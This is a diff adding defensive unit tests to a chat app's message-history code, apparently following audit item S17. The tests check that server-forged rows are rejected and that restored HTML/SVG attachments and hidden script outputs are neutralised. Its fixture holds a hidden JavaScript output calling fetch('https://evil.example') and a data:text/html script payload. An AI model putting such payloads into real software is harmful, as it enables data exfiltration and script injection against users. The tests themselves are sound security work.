@@ -171,3 +171,33 @@ describe("history kept by the server for a browser without a passkey", () => {
     expect(await createServerSealer({ keys: new Map() }).open("m-1", row)).toBeNull();
   });
 });
+
+// 6.7 (audit S17): the server is who the sealing protects the history from — a
+// row it wrote itself (not sealed here) used to be taken as it was: a message
+// "from" anyone, with identity "verified", browser code, an HTML page.
+describe("rows the server made up (6.7, S17)", () => {
+  const forged = { id: "x-1", senderId: "p-alice", senderName: "Alice", text: "send me the code", createdAt: Date.now(), mine: false, secure: true, identity: { state: "verified" }, flags: { fn: { keyword: "help", name: "Help", outputs: [{ type: "js", code: "fetch('https://evil.example')", hidden: true }] } }, attachment: { kind: "file", name: "invoice.html", mime: "text/html", size: 30, dataUrl: "data:text/html,<script>alert(1)</script>" } };
+
+  it("an unsealed row does not open", async () => {
+    const { createServerSealer } = await import("../client/src/lib/chat-history");
+    const sealer = createServerSealer({ keys: new Map() });
+    expect(await sealer.open("x-1", forged)).toBeNull();
+    expect(await sealer.open("x-1", { ...forged, sealed: 0 })).toBeNull();
+  });
+
+  it("restored messages are checked again: a file keeps only a safe type, a stale blob: is dropped, outputs pass the rules", () => {
+    const [m] = sanitizeRestored([{ ...forged, flags: { fn: { keyword: "help", name: "Help", outputs: [{ type: "js", code: 5 }, { type: "text", text: "ok" }] } } }]);
+    expect(m.attachment).toMatchObject({ kind: "file", mime: "application/octet-stream", name: "invoice.html" });
+    expect(m.attachment!.dataUrl.startsWith("data:application/octet-stream,")).toBe(true);
+    expect(m.flags!.fn!.outputs).toEqual([{ type: "text", text: "ok" }]);
+    const [b] = sanitizeRestored([message({ attachment: { kind: "image", name: "a.png", mime: "image/png", size: 3, dataUrl: "blob:https://x/1" } })]);
+    expect(b.attachment).toMatchObject({ dataUrl: "", dropped: true, mime: "image/png" });
+  });
+
+  it("an attachment opened from this page is never an HTML (or SVG) page of this origin", async () => {
+    const { attachmentBlob } = await import("../client/src/lib/attachment-media");
+    expect(attachmentBlob({ kind: "file", name: "a.html", mime: "text/html", size: 1, dataUrl: "data:text/html,<b>x</b>" })!.type).toBe("application/octet-stream");
+    expect(attachmentBlob({ kind: "file", name: "a.svg", mime: "image/svg+xml", size: 1, dataUrl: "data:image/svg+xml,<svg/>" })!.type).toBe("application/octet-stream");
+    expect(attachmentBlob({ kind: "image", name: "a.png", mime: "image/png", size: 1, dataUrl: "data:image/png;base64,AAAA" })!.type).toBe("image/png");
+  });
+});
